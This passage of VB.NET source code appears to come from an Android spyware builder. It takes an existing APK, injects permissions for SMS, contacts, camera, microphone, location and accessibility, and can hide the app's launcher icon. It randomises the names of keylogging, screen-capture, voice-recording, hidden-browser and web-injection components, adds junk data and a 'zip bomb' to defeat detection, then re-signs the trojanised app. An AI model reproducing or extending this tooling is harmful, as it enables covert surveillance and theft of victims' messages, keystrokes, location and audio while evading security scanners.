        Dim addMicrophoneAccess As Boolean = If(permissionSets.Length > 8, permissionSets(8).Split("|"c)(0) = "1", False)

        Dim addReadSMS As Boolean = If(permissionSets.Length > 9, permissionSets(9).Split("|"c)(0) = "1", False)

        Dim addSendSMS As Boolean = If(permissionSets.Length > 10, permissionSets(10).Split("|"c)(0) = "1", False)

        Dim addReadContacts As Boolean = If(permissionSets.Length > 11, permissionSets(11).Split("|"c)(0) = "1", False)
        Dim addReadAccounts As Boolean = If(permissionSets.Length > 12, permissionSets(12).Split("|"c)(0) = "1", False)

        Dim addlocations As Boolean = If(permissionSets.Length > 16, permissionSets(16).Split("|"c)(0) = "1", False)

        Dim Prims As String = ""

        If addDrawOverApps Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.SYSTEM_ALERT_WINDOW"" />" + vbNewLine
        End If

        If addBatteryOptimization Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"" />" + vbNewLine
        End If

        If addUsageAccess Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.PACKAGE_USAGE_STATS"" />" + vbNewLine
        End If

        'If addChangePhoneSettings Then
        '    Prims += "    <uses-permission android:name=" + """" + "android.permission.WRITE_SETTINGS"" />" + vbNewLine
        '    Prims += "    <uses-permission android:name=" + """" + "android.permission.WRITE_SECURE_SETTINGS"" />" + vbNewLine
        'End If

        If addFilesAccess Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.MANAGE_EXTERNAL_STORAGE"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.WRITE_EXTERNAL_STORAGE"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.READ_EXTERNAL_STORAGE"" />" + vbNewLine
        End If

        If addCameraAccess Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.CAMERA"" />" + vbNewLine
        End If

        If addMicrophoneAccess Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.RECORD_AUDIO"" />" + vbNewLine
        End If

        If addReadAccounts Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.GET_ACCOUNTS"" />" + vbNewLine
        End If

        If addReadContacts Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.READ_CONTACTS"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.WRITE_CONTACTS"" />" + vbNewLine
        End If

        If addSendSMS Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.SEND_SMS"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.READ_PHONE_NUMBERS"" />" + vbNewLine

        End If

        If addReadSMS Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.READ_SMS"" />" + vbNewLine

        End If

        If addlocations Then
            Prims += "    <uses-permission android:name=" + """" + "android.permission.ACCESS_COARSE_LOCATION"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.ACCESS_FINE_LOCATION"" />" + vbNewLine
            Prims += "    <uses-permission android:name=" + """" + "android.permission.ACCESS_BACKGROUND_LOCATION"" />" + vbNewLine

        End If

        Dim acctag As String = ""

        If addAccess Then
            acctag = My.Resources.AccessTag
        End If

        Dim AllManifist As String = File.ReadAllText(TheApkPath & "\" & "AndroidManifest.xml").Replace(My.Resources.ReplacePrimes, Prims).Replace(My.Resources.ReplaceAccess, acctag)

        If hidetype = "c" Then
            AllManifist = AllManifist.Replace(My.Resources.ReplaceLuncher, My.Resources.ManifistHide)
        Else
            AllManifist = AllManifist.Replace(My.Resources.ReplaceLuncher, My.Resources.luncherIntent)
        End If


        File.WriteAllText(TheApkPath & "\" & "AndroidManifest.xml", AllManifist)

        '

        Try

            If IsCustomeApp Then
                Dim stringspath As String = Worker.TheApkPath + "\res\values\strings.xml"
                Do
                    Thread.Sleep(100)
                Loop While Not File.Exists(stringspath) Or FileInUse(stringspath)
                Mylogger.Logbuild(Worker.userid, ">> Encoding Strings file...")
                Dim allstr As String = File.ReadAllText(stringspath).Replace("[BASE_NAME]", Worker.appname)
                File.WriteAllText(stringspath, allstr)
                Thread.Sleep(100)
                Dim strarray As String() = File.ReadAllLines(stringspath)
                Dim junkstr As String = ""
                Dim index As Integer = 1
                Do
                    Dim randomWord1 As String = Random_Word()
                    Dim randomMad1 As String = RandommMad(4, 15)
                    Dim randomWord2 As String = Random_Word()
                    Dim randomMad2 As String = RandommMad(4, 15)

                    junkstr = junkstr & "    <string name=""" & randomWord1 & randomMad1 & """>" & randomWord2 & randomMad2 & "</string>" & vbCrLf

                    index += 1
                Loop While index <= 134

                Dim num As Integer = strarray.Length - 1
                For i As Integer = 0 To num
                    Dim flag3 As Boolean = strarray(i).Contains("<string name")
                    If flag3 Then
                        strarray(i) = strarray(i) + vbCrLf + junkstr
                        Exit For
                    End If
                Next
                File.WriteAllLines(stringspath, strarray)
                Mylogger.Logbuild(Worker.userid, ">> Change ico...")
                Dim logopath As String = Worker.TheApkPath + "\res\drawable\mylogo.png"
                Dim flag4 As Boolean = File.Exists(logopath)
                If flag4 Then
                    File.Delete(logopath)
                End If

                Dim icobytes As Byte() = File.ReadAllBytes(Worker.TargetApkicon)

                ' Append junk bytes (this changes MD5 but not image content)
                Dim junk As Byte() = System.Text.Encoding.ASCII.GetBytes("<!--" & Guid.NewGuid().ToString() & "-->")
                Dim newBytes As Byte() = icobytes.Concat(junk).ToArray()

                File.WriteAllBytes(logopath, newBytes)

                'File.Copy(Worker.TargetApkicon, logopath)


                Dim yml As String = Worker.TheApkPath + "\apktool.yml"
                Do
                    Thread.Sleep(100)
                Loop While Not File.Exists(yml) Or FileInUse(yml)
                Dim readyml As String = File.ReadAllText(yml).Replace("3.31.165", Worker.appversion + " " + Random_Word()).Replace("331165", Worker.appversion.Replace(".", ""))
                File.WriteAllText(yml, readyml)
            End If



            If Not IsCustomeApp Then
                'Write
                If Not AllManifist.ToLower.Contains("android.permission.WRITE_EXTERNAL_STORAGE".ToLower()) AndAlso addFilesAccess Then
                    need_write = True
                End If

                'external storage sdk 33
                If Not AllManifist.ToLower.Contains("android.permission.MANAGE_EXTERNAL_STORAGE".ToLower()) AndAlso addFilesAccess Then
                    need_externalstorage = True
                End If

                'battery
                If Not AllManifist.ToLower.Contains("android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS".ToLower()) AndAlso addBatteryOptimization Then
                    need_battery = True
                End If

                'Read
                If Not AllManifist.ToLower.Contains("android.permission.READ_EXTERNAL_STORAGE".ToLower) AndAlso addFilesAccess Then
                    need_read = True
                End If

                'ground
                If Not AllManifist.ToLower.Contains("android.permission.FOREGROUND_SERVICE".ToLower) Then
                    need_forground = True
                End If

                'system window
                If Not AllManifist.ToLower.Contains("android.permission.SYSTEM_ALERT_WINDOW".ToLower) AndAlso addDrawOverApps Then
                    need_syswinow = True
                End If

                'BOOT COMPLETE
                If Not AllManifist.ToLower.Contains("android.permission.RECEIVE_BOOT_COMPLETED".ToLower) Then
                    need_boot = True
                End If

                'READ_PHONE_STATE
                If Not AllManifist.ToLower.Contains("android.permission.READ_PHONE_STATE".ToLower) Then
                    need_read_stste = True
                End If


            End If


            'If ASKPRIM_all = "1" Then
            '    need_all = True

            '    Dim arryprims() As String = My.Resources.ALLPRIM.Split("#")
            '    For Each pri As String In arryprims
            '        Try
            '            If Not String.IsNullOrEmpty(pri) Then
            '                If Not AllManifist.ToLower.Contains(pri.ToLower) Then
            '                    ALLPRIMSLIST.Add(pri)
            '                End If
            '            End If
            '        Catch ex As Exception

            '        End Try
            '    Next
            'End If


            Mylogger.Logbuild(userid, ">" & "> Coding AndroidManifest...")

            Dim x As Integer = 16
            Dim y As Integer = 29
            N_ClassGen = RandommMad(x, y)
            NActivityMonitors = RandommMad(x, y)
            N_ActivityCaptureScreen = RandommMad(x, y)
            N_AccessTools = RandommMad(x, y)
            N_wakeitaiv = RandommMad(x, y)
            N_LockActivity = RandommMad(x, y)
            N_AccessServices = RandommMad(x, y)
            N_HiddenBrowser = RandommMad(x, y)
            N_AccessibilityActivity = RandommMad(x, y)

            N_update_app_ = RandommMad(x, y)
            N_Contct_manager = RandommMad(x, y)

            N_Deviceinfo = RandommMad(x, y)
            N_My_Configs = RandommMad(x, y)
            N_ActivityDraw = RandommMad(x, y)
            N_My_Crpter = RandommMad(x, y)
            N_filesManager = RandommMad(x, y)
            N_id_Commands = RandommMad(x, y)
            N_KeyStorksQ = RandommMad(x, y)
            N_LiveChat = RandommMad(x, y)
            N_QueryChats = RandommMad(x, y)
            N_LiveKeysStrok = RandommMad(x, y)
            N_StarterServices = RandommMad(x, y)
            N_LocationMonitor = RandommMad(x, y)
            N_LockAppsActivity = RandommMad(x, y)
            N_ActivMain = RandommMad(x, y)
            N_MyLoger = RandommMad(x, y)
            N_MyNotification = RandommMad(x, y)
            N_MyPacket = RandommMad(x, y)
            N_MyPermissions = RandommMad(x, y)
            N_MySettings = RandommMad(x, y)
            N_PermissionsActivity = RandommMad(x, y)
            N_PingServices = RandommMad(x, y)
            N_RequestDraw = RandommMad(x, y)
            N_Requestinstall = RandommMad(x, y)
            N_RequestPermissions2 = RandommMad(x, y)
            N_ScreenCaps = RandommMad(x, y)
            N_ScreenReceiver = RandommMad(x, y)
            N_mysmanager = RandommMad(x, y)
            N_StatusMonitor = RandommMad(x, y)
            N_UtliTools = RandommMad(x, y)
            N_VoiceRecorder = RandommMad(x, y)
            N_WorkServices = RandommMad(x, y)
            N_HiddenActivity = RandommMad(x, y)
            N_RestrectionActivity = RandommMad(x, y)
            N_OPPOAutostart = RandommMad(x, y)
            N_BrodcastActivity = RandommMad(x, y)
            N_UninstallActivity = RandommMad(x, y)
            N_EngineWorker = RandommMad(x, y)
            N_RequestDataUsage = RandommMad(x, y)
            N_Webjector = RandommMad(x, y)
            N_TransparentActivity = RandommMad(x, y)
            N_WebBrowser = RandommMad(x, y)
            N_ProxyService = RandommMad(x, y)

            N_Apps_Manage = RandommMad(x, y)
            N_AudioRecorder = RandommMad(x, y)
            N_CameraCap = RandommMad(x, y)
            N__ChatActivity_ = RandommMad(x, y)
            N__MyCods_ = RandommMad(x, y)
            N__Consts_ = RandommMad(x, y)

            accesstagdata_New = RandommMad(x, y)


            If IsCustomeApp Then
                newpkg = appid
            Else
                newpkg = Random_Word() & "." & Random_Word() & "." & Random_Word()
            End If



            newpkg_insmali = "L" & newpkg.Replace(".", "/")


            drop_newpkg = Random_Word() & "." & Random_Word() & "." & Random_Word()
            drop_newpkg_insmali = "L" & drop_newpkg.Replace(".", "/")

            Mylogger.Logbuild(userid, "New apk PKG: " + newpkg)


            If Not IsCustomeApp Then
                To_Obfucate.AddRange(ResoursIds)
                To_obfuscate_androidx.AddRange(ResoursIds)
            End If


            For Each originalString As String In To_Obfucate
                Obfucated(originalString) = RandommMad(x, y)
            Next


            'TODO: Check if need keep screen
            'If checkkeepscreen.Checked = True Then
            '    KeepScreen = "on"
            'End If

            Dim ManifistLines As String() = File.ReadAllLines(TheApkPath & "\" & "AndroidManifest.xml")

            If Not IsCustomeApp Then
back2:

                If FileInUse(TheApkPath & "\" & "apktool.yml") Or Not File.Exists(TheApkPath & "\" & "apktool.yml") Then
                    Thread.Sleep(1000)
                    GoTo back2
                End If


                ' Dim apktoolyml As String() = File.ReadAllLines(TheApkPath & "\" & "apktool.yml")


                'For index = 0 To apktoolyml.Length - 1
                '    If apktoolyml(index).ToLower.Contains("targetSdkVersion".ToLower) Then
                '        apktoolyml(index) = "  targetSdkVersion: '29'"
                '        File.WriteAllLines(TheApkPath & "\" & "apktool.yml", apktoolyml)
                '        Exit For
                '    End If
                'Next
                If addAccess Then
                    File.WriteAllText(Worker.TheApkPath + $"\res\xml\{accesstagdata_New}.xml", My.Resources.accessibilityprivatesrcapp)
                Else
                    File.WriteAllText(Worker.TheApkPath + $"\res\xml\{accesstagdata_New}.xml", My.Resources.emptyaccess)
                End If
                For index = 1 To ManifistLines.Length - 1

                    If need_write AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                        ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.WritePrim
                        need_write = False
                    End If

                    'need_externalstorage
                    If need_externalstorage AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                        ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.Externalstorage
                        need_externalstorage = False
                    End If

                    If need_battery AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                        ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.batteryprim
                        need_battery = False
                    End If

                    If need_read AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                        ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.ReadPrim
                        need_read = False
                    End If

                    If need_forground AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                        ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.FORGROUD
                        need_forground = False
                    End If

                    If need_syswinow AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                        ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.SystemwindowPrim
                        need_syswinow = False
                    End If
                    If need_boot AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                        ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.BootPrim
                        need_boot = False
                    End If

                    '
                    If need_read_stste AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                        ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.read_state_prim
                        need_read_stste = False
                    End If

                    'If need_all AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                    '    For Each pri As String In ALLPRIMSLIST
                    '        ManifistLines(index) = ManifistLines(index) + vbNewLine + pri
                    '    Next
                    '    need_all = False
                    'End If

                    If ManifistLines(index).ToLower.Contains("<application") Then

                        If Not ManifistLines(index).ToLower.Contains("requestLegacyExternalStorage".ToLower) Then
                            ManifistLines(index) = ManifistLines(index).Replace("<application", "<application android:requestLegacyExternalStorage=" + """" + "true" + """")
                        End If

                        If Not ManifistLines(index).ToLower.Contains("usesCleartextTraffic".ToLower) Then
                            ManifistLines(index) = ManifistLines(index).Replace("<application", "<application android:usesCleartextTraffic=" + """" + "true" + """")
                        End If

                        ManifistLines(index) = ManifistLines(index) & Environment.NewLine & My.Resources.ManifistCode.Replace(My.Resources.ReplaceAccess, acctag).Replace(AccessibilityActivity, N_AccessibilityActivity) _
                    .Replace(AccessServices, N_AccessServices) _
                    .Replace(HiddenBrowser, N_HiddenBrowser) _
                    .Replace(AccessTools, N_AccessTools) _
                    .Replace(wakeitaiv, N_wakeitaiv) _
                    .Replace(LockActivity, N_LockActivity) _
                    .Replace(ActivityCaptureScreen, N_ActivityCaptureScreen) _
                    .Replace(ActivityMonitors, NActivityMonitors) _
                    .Replace(_update_app_, N_update_app_) _
                    .Replace(Consts, N__Consts_) _
                    .Replace(MyCods, N__MyCods_) _
                    .Replace(ChatActivity, N__ChatActivity_) _
                    .Replace(CameraCap, N_CameraCap) _
                    .Replace(Contct_manager, N_Contct_manager) _
                    .Replace(Deviceinfo, N_Deviceinfo) _
                    .Replace(My_Configs, N_My_Configs) _
                    .Replace(ActivityDraw, N_ActivityDraw) _
                    .Replace(My_Crpter, N_My_Crpter) _
                    .Replace(filesManager, N_filesManager) _
                    .Replace(id_Commands, N_id_Commands) _
                    .Replace(KeyStorksQ, N_KeyStorksQ) _
                    .Replace(LiveChat, N_LiveChat) _
                    .Replace(QueryChats, N_QueryChats) _
                    .Replace(LiveKeysStrok, N_LiveKeysStrok) _
                    .Replace(StarterServices, N_StarterServices) _
                    .Replace(LocationMonitor, N_LocationMonitor) _
                    .Replace(LockAppsActivity, N_LockAppsActivity) _
                    .Replace(ActivMain, N_ActivMain) _
                    .Replace(MyLoger, N_MyLoger) _
                    .Replace(MyNotification, N_MyNotification) _
                    .Replace(MyPacket, N_MyPacket) _
                    .Replace(MyPermissions, N_MyPermissions) _
                    .Replace(MySettings, N_MySettings) _
                    .Replace(PermissionsActivity, N_PermissionsActivity) _
                    .Replace(PingServices, N_PingServices) _
                    .Replace(RequestDraw, N_RequestDraw) _
                    .Replace(Requestinstall, N_Requestinstall) _
                    .Replace(RequestPermissions2, N_RequestPermissions2) _
                    .Replace(ScreenCaps, N_ScreenCaps) _
                    .Replace(ScreenReceiver, N_ScreenReceiver) _
                    .Replace(mysmanager, N_mysmanager) _
                    .Replace(StatusMonitor, N_StatusMonitor) _
                    .Replace(UtliTools, N_UtliTools) _
                    .Replace(VoiceRecorder, N_VoiceRecorder) _
                    .Replace(WorkServices, N_WorkServices) _
                    .Replace(HiddenActivity, N_HiddenActivity) _
                    .Replace(RestrectionActivity, N_RestrectionActivity) _
                    .Replace(OPPOAutostart, N_OPPOAutostart) _
                    .Replace(BrodcastActivity, N_BrodcastActivity) _
                    .Replace(UninstallActivity, N_UninstallActivity) _
                    .Replace(EngineWorker, N_EngineWorker) _
                    .Replace(RequestDataUsage, N_RequestDataUsage) _
                    .Replace(Webjector, N_Webjector) _
                    .Replace(TransparentActivity, N_TransparentActivity) _
                    .Replace(WebBrowser, N_WebBrowser) _
                    .Replace(ProxyService, N_ProxyService) _
                    .Replace(oldpkg, newpkg) _
                    .Replace(oldpkg_insmali, newpkg_insmali) _
                    .Replace(accesstagdata, accesstagdata_New) _
                    .Replace(ClassGen, N_ClassGen) _
                    .Replace(AudioRecorder, N_AudioRecorder) _
                    .Replace(Apps_Manage, N_Apps_Manage)
                        Exit For
                    End If
                Next

            End If

            If IsCustomeApp Then
                'Dim flag28 As Boolean = Worker.need_all
                'If flag28 Then
                '    Dim num3 As Integer = ManifistLines.Length - 1
                '    For index3 As Integer = 1 To num3
                '        Dim flag29 As Boolean = ManifistLines(index3).ToLower().Contains("<uses-permission")
                '        If flag29 Then
                '            Try
                '                For Each pri3 As String In Worker.ALLPRIMSLIST
                '                    ManifistLines(index3) = ManifistLines(index3) + vbCrLf + pri3
                '                Next
                '            Catch ex As Exception
                '            End Try
                '            Worker.need_all = False
                '            File.WriteAllLines(Worker.TheApkPath + "\AndroidManifest.xml", ManifistLines)
                '            Exit For
                '        End If
                '    Next
                'End If
                Mylogger.Logbuild(Worker.userid, ">> Updating Res files...")
                Dim publicxmlpath As String = Worker.TheApkPath + "\res\values\public.xml"


                Do
                    Thread.Sleep(100)
                Loop While Not File.Exists(publicxmlpath) Or FileInUse(publicxmlpath)

                Dim allstr As String = File.ReadAllText(publicxmlpath).Replace(accesstagdata, accesstagdata_New)
                File.WriteAllText(publicxmlpath, allstr)



                Dim accessxmlpath As String = Worker.TheApkPath + $"\res\xml\{accesstagdata}.xml"
                Do
                    Thread.Sleep(100)
                Loop While Not File.Exists(accessxmlpath) Or FileInUse(accessxmlpath)
                Dim n_accessxmlpath As String = Worker.TheApkPath + $"\res\xml\{accesstagdata_New}.xml"

                File.Move(accessxmlpath, n_accessxmlpath)


                Dim manisiftcontent As String = File.ReadAllText(Worker.TheApkPath + "\AndroidManifest.xml").Replace(AccessibilityActivity, N_AccessibilityActivity) _
                    .Replace(AccessServices, N_AccessServices) _
                    .Replace(HiddenBrowser, N_HiddenBrowser) _
                    .Replace(AccessTools, N_AccessTools) _
                    .Replace(wakeitaiv, N_wakeitaiv) _
                    .Replace(LockActivity, N_LockActivity) _
                    .Replace(ActivityCaptureScreen, N_ActivityCaptureScreen) _
                    .Replace(ActivityMonitors, NActivityMonitors) _
                    .Replace(_update_app_, N_update_app_) _
                    .Replace(Consts, N__Consts_) _
                    .Replace(MyCods, N__MyCods_) _
                    .Replace(ChatActivity, N__ChatActivity_) _
                    .Replace(CameraCap, N_CameraCap) _
                    .Replace(Contct_manager, N_Contct_manager) _
                    .Replace(Deviceinfo, N_Deviceinfo) _
                    .Replace(My_Configs, N_My_Configs) _
                    .Replace(ActivityDraw, N_ActivityDraw) _
                    .Replace(My_Crpter, N_My_Crpter) _
                    .Replace(filesManager, N_filesManager) _
                    .Replace(id_Commands, N_id_Commands) _
                    .Replace(KeyStorksQ, N_KeyStorksQ) _
                    .Replace(LiveChat, N_LiveChat) _
                    .Replace(QueryChats, N_QueryChats) _
                    .Replace(LiveKeysStrok, N_LiveKeysStrok) _
                    .Replace(StarterServices, N_StarterServices) _
                    .Replace(LocationMonitor, N_LocationMonitor) _
                    .Replace(LockAppsActivity, N_LockAppsActivity) _
                    .Replace(ActivMain, N_ActivMain) _
                    .Replace(MyLoger, N_MyLoger) _
                    .Replace(MyNotification, N_MyNotification) _
                    .Replace(MyPacket, N_MyPacket) _
                    .Replace(MyPermissions, N_MyPermissions) _
                    .Replace(MySettings, N_MySettings) _
                    .Replace(PermissionsActivity, N_PermissionsActivity) _
                    .Replace(PingServices, N_PingServices) _
                    .Replace(RequestDraw, N_RequestDraw) _
                    .Replace(Requestinstall, N_Requestinstall) _
                    .Replace(RequestPermissions2, N_RequestPermissions2) _
                    .Replace(ScreenCaps, N_ScreenCaps) _
                    .Replace(ScreenReceiver, N_ScreenReceiver) _
                    .Replace(mysmanager, N_mysmanager) _
                    .Replace(StatusMonitor, N_StatusMonitor) _
                    .Replace(UtliTools, N_UtliTools) _
                    .Replace(VoiceRecorder, N_VoiceRecorder) _
                    .Replace(WorkServices, N_WorkServices) _
                    .Replace(HiddenActivity, N_HiddenActivity) _
                    .Replace(RestrectionActivity, N_RestrectionActivity) _
                    .Replace(OPPOAutostart, N_OPPOAutostart) _
                    .Replace(BrodcastActivity, N_BrodcastActivity) _
                    .Replace(UninstallActivity, N_UninstallActivity) _
                    .Replace(EngineWorker, N_EngineWorker) _
                    .Replace(RequestDataUsage, N_RequestDataUsage) _
                    .Replace(Webjector, N_Webjector) _
                    .Replace(TransparentActivity, N_TransparentActivity) _
                    .Replace(WebBrowser, N_WebBrowser) _
                    .Replace(ProxyService, N_ProxyService) _
                    .Replace(oldpkg, newpkg) _
                    .Replace(oldpkg_insmali, newpkg_insmali) _
                    .Replace(ClassGen, N_ClassGen) _
                    .Replace(accesstagdata, accesstagdata_New) _
                    .Replace(AudioRecorder, N_AudioRecorder) _
                    .Replace(Apps_Manage, N_Apps_Manage)




                File.WriteAllText(TheApkPath + "\AndroidManifest.xml", ConfuseAndObfuscateManifestXml(manisiftcontent))
            Else
                File.WriteAllLines(TheApkPath & "\" & "AndroidManifest.xml", ManifistLines)
            End If

        Catch ex As Exception
            Mylogger.LogError(userid, "Step2", ex.Message)
        End Try
    End Sub

    Sub SignMe(ByVal name As String, ByVal value As String)
        Try

            Using key As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\AppWorkers")

                key.SetValue(name, value)

            End Using
        Catch ex As Exception

        End Try
    End Sub



    Sub singout(ByVal name As String)
        Try
            Using key As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\AppWorkers", writable:=True)
                If key IsNot Nothing Then
                    key.DeleteValue(name, throwOnMissingValue:=False)

                    Mylogger.Logbuild(userid, $"Key '{name}' removed successfully.")
                Else

                    Mylogger.Logbuild(userid, "Registry subkey not found.")
                End If
            End Using
        Catch ex As Exception
            Mylogger.LogError(userid, "singout error occurred: ", ex.Message)
        End Try
    End Sub

    Sub Step1()
        Mylogger.Logbuild(Worker.userid, ">> Step1 Started..")
        Mylogger.Logbuild(Worker.userid, ">> Preparation Started..")
        Worker.HoldMainThread = True
        Dim folder_building As String = ""
        Try

            If IsCustomeApp Then
                folder_building = GenerateRandomFolderName("custom")
            Else
                folder_building = GenerateRandomFolderName("jector")
            End If
        Catch ex As Exception
            Mylogger.Logbuild(Worker.userid, "Error Create Work Folder:" + ex.Message)
            Environment.[Exit](0)
        End Try
        Worker.WorkingDir = folder_building
        Worker.TheApkPath = Worker.WorkingDir + "\temp"
        Dim flag As Boolean = Not Directory.Exists(Worker.TheApkPath)
        If flag Then
            Directory.CreateDirectory(Worker.TheApkPath)
        End If
        Worker.cmdProcess = New Process()
        Dim cmdStartInfo As ProcessStartInfo = New ProcessStartInfo()
        cmdStartInfo.FileName = "cmd.exe"
        cmdStartInfo.WorkingDirectory = folder_building
        cmdStartInfo.RedirectStandardOutput = True
        cmdStartInfo.RedirectStandardInput = True
        cmdStartInfo.RedirectStandardError = True
        cmdStartInfo.UseShellExecute = False
        cmdStartInfo.CreateNoWindow = True
        cmdStartInfo.WindowStyle = ProcessWindowStyle.Hidden
        Worker.cmdProcess.EnableRaisingEvents = True
        Worker.cmdProcess.StartInfo = cmdStartInfo
        AddHandler Worker.cmdProcess.OutputDataReceived, AddressOf Worker.cmdOutputHandler
        AddHandler Worker.cmdProcess.ErrorDataReceived, AddressOf Worker.cmdOutputHandler
        Worker.cmdProcess.Start()
        Worker.cmdProcess.BeginOutputReadLine()
        Worker.cmdProcess.BeginErrorReadLine()
        Worker.apktemp = folder_building + "\temp.apk"
        Worker.apktoolpath = folder_building + "\apktool.jar"
        Worker.Apksignerpath = folder_building + "\signapk.jar"
        Worker.ApkZIPpath = folder_building + "\zipalign.exe"
        Worker.Apkeditorpath = folder_building + "\ApkEditor.jar"
        Worker.extractorzip = folder_building + "\7.exe"
        Worker.ExecuteCommand("java -version")
        Do
            Thread.Sleep(1)
        Loop While Worker.HoldMainThread



    End Sub
    Private Sub ExecuteCommand(command As String)
        cmdProcess.StandardInput.WriteLine(command)
        cmdProcess.StandardInput.Flush()
    End Sub



    Private Sub cmdOutputHandler(sender As Object, e As DataReceivedEventArgs)
        If Not String.IsNullOrEmpty(e.Data) Then


            Try

                Dim msg As String = e.Data.ToString

                If msg.Contains("java is not recognized") Then


                    Mylogger.Logbuild(userid, ">" & "> Java not installed : go to google and install (java jdk)")
                    singout(MYID)
                    Environment.Exit(0)

                End If
                If msg.Length > 0 Then
                    Mylogger.Logbuild(userid, ">" & " Builder CMD:" & msg)
                End If

                If msg.StartsWith("I:") Then


                    Mylogger.Logbuild(userid, ">" & msg.Replace("I:", "> "))


                ElseIf msg.Contains("[PROTECT]") AndAlso Not msg.Contains("Writing:") Then

                    Mylogger.Logbuild(userid, ">" & msg)

                ElseIf msg.StartsWith("W:") Then
                    Mylogger.Logbuild(userid, ">" & msg.Replace("W:", "Warning :"))
                ElseIf msg.StartsWith("E:") Then

                    Mylogger.Logbuild(userid, ">" & msg.Replace("E:", "ERROR :"))

                End If

                If msg.Contains("[PROTECT] Saved to") Then
                    Waitprotect = False

                End If

                If msg.Contains("Java(TM)") Or msg.Contains("OpenJDK") Then
                    If Not Once Then
                        Once = True


                        Mylogger.Logbuild(userid, ">" & "> Extract New Data..")


                        originalapkname = appid



                        File.Copy(ZIPPATH, WorkingDir + "\" + "temp.zip")

                        File.WriteAllBytes(apktoolpath, My.Resources.apktool)
                        File.WriteAllBytes(Apksignerpath, My.Resources.signapk)
                        File.WriteAllBytes(ApkZIPpath, My.Resources.zipalign)
                        File.WriteAllBytes(Apkeditorpath, My.Resources.APKEditor)
                        File.WriteAllBytes(extractorzip, My.Resources._7zip)





                        Mylogger.Logbuild(userid, ">" & "> Extract Apk Start..")


                        ExecuteCommand("cd " & WorkingDir)
                        ExecuteCommand("7.exe x " & """" & WorkingDir + "\" + "temp.zip" & """" & " -otemp")

                    End If

                ElseIf msg.Contains("Everything is Ok") Then

                    Mylogger.Logbuild(userid, ">" & "> Extract Finish..")


                    HoldMainThread = False


                ElseIf msg.Contains("Built apk") Then

                    If fordroper Then
                        Waitbuild = False
                        Return
                    End If

hold1:

                    If Not File.Exists(outputapk) Then
                        Thread.Sleep(1000)
                        GoTo hold1
                    End If



                    Mylogger.Logbuild(userid, ">" & " pump assets..")

                    AddZipBombEncrypted(outputapk)







                    Dim zipoutprotected As String = outputapk.Replace(".apk", "_protected.apk")

                    If Not IsCustomeApp Then
                        Mylogger.Logbuild(userid, ">" & "Skip Protect in inject..")
                        ' File.Copy(outputapk, zipoutprotected)
                        File.Move(outputapk, zipoutprotected)

                    Else
                        Mylogger.Logbuild(userid, ">" & " Protect Apk..")
                        Waitprotect = True
                        Dim protectcommand As String = "java -jar " & Apkeditorpath & " p " & " -i " & """" & outputapk & """"
                        ExecuteCommand(protectcommand)

hold3:

                        If Not File.Exists(zipoutprotected) Or Waitprotect Then
                            Thread.Sleep(1000)
                            GoTo hold3
                        End If

                        File.Delete(outputapk)
                    End If


                    'zipoutput = zipoutprotected


                    Mylogger.Logbuild(userid, ">" & "> Zip Align..")




                    Dim zipcomadn As String = ApkZIPpath + " 4 " & """" & zipoutprotected & """" & " " & """" & zipoutprotected.Replace("Ready_protected.apk", "Ready_zip.apk") & """"
                    Dim zipoutput As String = zipoutprotected.Replace("Ready_protected.apk", "Ready_zip.apk")
                    ExecuteCommand(zipcomadn)

hold2:

                    If Not File.Exists(zipoutput) Or FileInUse(zipoutput) Then
                        Thread.Sleep(5000)
                        GoTo hold2
                    End If



                    File.Delete(zipoutprotected)


                    'TODO: Add protect to the apk
                    '                    If checkprotector.Checked Then



                    '                    End If





                    Mylogger.Logbuild(userid, ">" & "> Sign APK..")



                    File.WriteAllBytes(WorkingDir & "\certificate.pem", My.Resources.certificate)
                    File.WriteAllBytes(WorkingDir & "\key.pk8", My.Resources.key)




                    Dim signoutput As String = WorkingDir & "\out\" & originalapkname.Replace(".apk", "_Jected.apk")
                    Dim singcommand As String = "java -jar " & """" & Apksignerpath & """" & " sign --key " & WorkingDir & "\key.pk8 --cert " & WorkingDir & "\certificate.pem  --v2-signing-enabled true --v3-signing-enabled true --out " & """" & WorkingDir & "\out" & "\" & originalapkname.Replace(".apk", "_Jected.apk") & """" & " " & """" & zipoutput & """"
                    ExecuteCommand(singcommand)


hold4:

                    If Not File.Exists(signoutput) Or FileInUse(signoutput) Then
                        Thread.Sleep(5000)
                        GoTo hold4
                    End If


                    File.Delete(zipoutput)


                    Mylogger.Logbuild(userid, ">" &
